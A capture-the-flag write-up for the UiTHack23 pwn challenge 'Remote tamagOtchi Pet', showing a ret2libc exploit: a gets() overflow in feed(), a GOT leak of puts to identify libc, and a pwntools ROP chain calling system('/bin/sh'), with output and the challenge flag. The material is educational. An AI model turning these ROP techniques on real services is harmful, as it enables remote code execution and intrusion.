> # Pwn - Remote tamagOtchi Pet
> > Pwn - 500pts
>
> You might remember the Tamagotchi from the late 90's or early 2000's. Good news, we have improved the tamagotchi by putting everyone's favourite animal on the web so you don't loose it!
>
> Here's your [tamagotchi](src/tamagotchi)
>
> Connect with netcat to play with your tamagotchi
> ```command
> $ nc motherload.td.org.uit.no 6400
> ```
>
> The flag is located in the home directory on the server.

## Writeup
Looking at the challenge text we see that we can expect this to be a ROP-challenge (capitalized letters in challenge name). Another way to see this is a ROP-challenge is that we need to get a shell to view the flag, and does not have function clearly giving us the shell.

To get a shell on the server we need the following:
- The offset to the rip-register
- The libc version being used by the server
- The address of the *system()* command so that we can call `/bin/sh`

Looking through the source code we see that `gets()` have been used two places in the code, and as we know this indicates a buffer overflow. We choose to exploit the one in the `feed()` function as it requires less user-input to get there.

### Finding the offset
As in the mp3_player challenge we can find the offset with [find_offset.py](find_offset.py)
```command
$ python3 find_offset.py
[+] Parsing corefile...: Done
[+] Offset is 40
```

### Finding the libc
To find the libc version used by the server we can leak the address of one or multiple functions that are loaded into the GOT (global offset table). <br>
This can be done by overflowing the buffer *gets()* writes to, and call *puts()* or *printf()* to print a function address to the terminal. <br>
The following ROP-chain would look like this
```python
from pwn import *

context.arch = "amd64"
elf = ELF("./tamagotchi", checksec=False)
p = elf.process()

offset = 40
# Create the ROP chain to overflow the buffer with
rop = ROP(elf)
rop.raw(b"A"*offset)
rop.puts(elf.got["puts"])
rop.call(elf.symbols["feed"])

# Send the payload
p.recvuntil(b">> ")
p.sendline(b"2")
p.recvuntil(b">> ")
p.sendline(rop.chain())
p.recvuntil(b"\n\n")
```
Overflowing the buffer with this payload will make the program print the address of the *puts()* function for us (which we can convert from bytes to hex)
```python
puts_leak = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
log.info(f"Puts address found: {hex(puts_leak)}")
```
```command
$ python3 exploit.py
<snip>
[*] Loaded 14 cached gadgets for './tamagotchi'
[*] Puts address found: 0x7f26cebb4420
<snip>
```

Knowing the address in libc for the *puts()* function we can look up which version of libc it is with e.g [libc.rip](https://libc.rip/). Multiple possible versions show up here, so we could leak the address of another function to make sure we get the correct one by changing from the puts function to another function in the GOT (e.g printf).
```python
rop.puts(elf.got["printf"])
```

We find out that the libc version being used is (both works)
```
libc6_2.31-0ubuntu9.8_amd64
libc6_2.31-0ubuntu9.9_amd64
```

### Getting shell
Knowing the libc version we now can call `system("/bin/sh")` to get a shell on the box.

To do such we load in the libc into our exploit script, and set the base address of the libc so that it matches our puts leak.
```
libc = ELF("./libc.so", checksec=False)
libc.address = puts_leak - libc.symbols["puts"]
```

We can then craft a ROP-chain calling `system("/bin/sh")` for us when we overflow the same buffer once again (remember that we called the *feed()* function at the end of our first ROP-chain). Note that we need the ret-instruction in out ROP-chain to maintain stack-alignment, or else the payload won't work.
```python
ret_addr = rop.find_gadget(["ret"])[0]
rop = ROP(libc)
rop.raw(b"A"*offset)
rop.raw(p64(ret_addr))
rop.system(next(libc.search(b"/bin/sh")))

p.recvuntil(b">> ")
p.sendline(rop.chain())
p.interactive()
```
```command
$ python3 exploit.py
[*] Loaded 14 cached gadgets for './tamagotchi'
[*] Puts address found: 0x7f6e88316420
[*] Loaded 196 cached gadgets for './libc.so'
[*] Switching to interactive mode
Your fed your pet with AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a@
You pet is full

$ ls
flag.txt
tamagotchi
$ cat flag.txt
UiTHack23{t4ma_G0tcha_5h3ll}
```
```
UiTHack23{t4ma_G0tcha_5h3ll}
```
